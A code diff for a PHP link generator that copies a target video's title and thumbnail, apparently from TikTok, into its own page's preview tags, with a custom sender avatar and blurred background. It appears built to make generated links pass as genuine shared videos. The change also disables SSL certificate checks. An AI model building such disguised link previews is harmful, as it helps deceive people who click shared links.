@@ -40,9 +40,9 @@ try {
     die("Database error: " . $e->getMessage());
 }
 
-function fetch_target_meta($url) {
+function fetch_original_meta($url) {
     $meta = [
-        'title' => 'TikTok - Make Your Day',
+        'title' => 'TikTok Video',
         'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60'
     ];
 
@@ -50,8 +50,12 @@ function fetch_target_meta($url) {
     curl_setopt($ch, CURLOPT_URL, $url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
-    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
+    curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 6);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.5 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1');
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    
     $html = curl_exec($ch);
     curl_close($ch);
 
@@ -60,14 +64,18 @@ function fetch_target_meta($url) {
         @$dom->loadHTML(mb_convert_encoding($html, 'HTML-ENTITIES', 'UTF-8'));
         $xpath = new DOMXPath($dom);
 
+        // سحب العنوان الأصلي بدقة من وسوم OpenGraph أو Twitter أو Title العادية
         $titleNodes = $xpath->query('//meta[@property="og:title"]/@content | //meta[@name="twitter:title"]/@content | //title');
         if ($titleNodes->length > 0) {
-            $meta['title'] = trim($titleNodes->item(0)->nodeValue);
+            $val = trim($titleNodes->item(0)->nodeValue);
+            if (!empty($val)) $meta['title'] = $val;
         }
 
-        $imageNodes = $xpath->query('//meta[@property="og:image"]/@content | //meta[@name="twitter:image"]/@content');
+        // سحب الصورة المصغرة الأصلية بدقة
+        $imageNodes = $xpath->query('//meta[@property="og:image"]/@content | //meta[@name="twitter:image"]/@content | //link[@rel="image_src"]/@href');
         if ($imageNodes->length > 0) {
-            $meta['image'] = trim($imageNodes->item(0)->nodeValue);
+            $val = trim($imageNodes->item(0)->nodeValue);
+            if (!empty($val)) $meta['image'] = $val;
         }
     }
     return $meta;
@@ -149,6 +157,7 @@ if (isset($_GET['r'])) {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title><?php echo htmlspecialchars($meta_title); ?></title>
+    <!-- وسوم المعاينة الأصلية المسحوبة تلقائياً -->
     <meta property="og:title" content="<?php echo htmlspecialchars($meta_title); ?>">
     <meta property="og:image" content="<?php echo htmlspecialchars($meta_image); ?>">
     <meta property="og:type" content="video.other">
@@ -286,7 +295,7 @@ if (isset($_GET['r'])) {
     }
 }
 
-// إنشاء رابط جديد
+// إنشاء رابط جديد (سحب تلقائي بالكامل)
 $generated_link = "";
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
     $target_url = trim($_POST['target_url']);
@@ -296,12 +305,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
         $target_url = "https://" . $target_url;
     }
 
-    // سحب العنوان والصورة المصغرة تلقائياً من رابط الفيديو المستهدف
-    $scraped_meta = fetch_target_meta($target_url);
+    // سحب العنوان والصورة المصغرة الأصلية تلقائياً وبشكل كامل
+    $scraped_meta = fetch_original_meta($target_url);
     $meta_title = $scraped_meta['title'];
     $meta_image = $scraped_meta['image'];
 
-    // رفع صورة الحساب الشخصية
+    // رفع صورة الحساب
     $sender_avatar = "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=100&auto=format&fit=crop&q=60";
     if (isset($_FILES['avatar_file']) && $_FILES['avatar_file']['error'] === UPLOAD_ERR_OK) {
         $ext = pathinfo($_FILES['avatar_file']['name'], PATHINFO_EXTENSION);
@@ -312,7 +321,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
         $sender_avatar = trim($_POST['sender_avatar_url']);
     }
 
-    // رفع صورة الخلفية (اختياري، إذا لم ترفع صورة سيتم استخدام صورة الفيديو المسحوبة تلقائياً)
+    // رفع صورة الخلفية (اختياري)
     $bg_image_url = "";
     if (isset($_FILES['bg_file']) && $_FILES['bg_file']['error'] === UPLOAD_ERR_OK) {
         $ext = pathinfo($_FILES['bg_file']['name'], PATHINFO_EXTENSION);
@@ -418,7 +427,7 @@ if (!empty($filter_code)) {
                 </div>
 
                 <div>
-                    <label style="font-size: 11px; color: var(--text-muted); display: block; margin-bottom: 4px;">Background Blur Image (Optional, auto-extracted if empty):</label>
+                    <label style="font-size: 11px; color: var(--text-muted); display: block; margin-bottom: 4px;">Background Blur Image (Optional):</label>
                     <input type="file" name="bg_file" accept="image/*">
                     <input type="text" name="bg_image_url" placeholder="Or paste Background URL..." style="margin-top: 6px;">
                 </div>
